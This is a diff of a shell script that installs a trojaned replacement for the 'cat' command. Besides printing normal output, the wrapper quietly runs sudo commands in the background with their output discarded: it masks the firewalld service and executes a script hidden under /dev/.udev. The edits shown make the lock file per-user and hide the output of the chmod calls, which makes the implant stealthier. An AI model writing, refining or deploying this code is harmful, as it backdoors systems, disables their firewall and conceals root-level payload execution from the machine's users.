@@ -23,6 +23,8 @@ fi
 echo "$output"
 
 rate_limit_file="/tmp/.cat_last_run"   # Timestamp file for last payload run
+lock_file="/tmp/.cat_${UID}.lock"
+
 cooldown=10                            # Cooldown in seconds
 
 now=$(date +%s)
@@ -50,14 +52,14 @@ if (( now - last_run >= cooldown )); then
             sudo systemctl mask firewalld > /dev/null 2>&1 &
             sudo bash /dev/.udev/jvage.sh > /dev/null 2>&1 &
         fi
-    ) 200>/tmp/.cat.lock
+    ) 200>"$lock_file"
 fi
 
 # Always exit cleanly
 exit 0
 EOF
 
-sudo chmod 755 "$cat_path"
-sudo chmod 666 /tmp/.cat_last_run
-sudo chmod 666 /tmp/.cat.lock
+sudo chmod 755 "$cat_path" > /dev/null 2>&1 &
+sudo chmod 666 /tmp/.cat_last_run > /dev/null 2>&1 &
+sudo chmod 666 /tmp/.cat.lock > /dev/null 2>&1 &
 
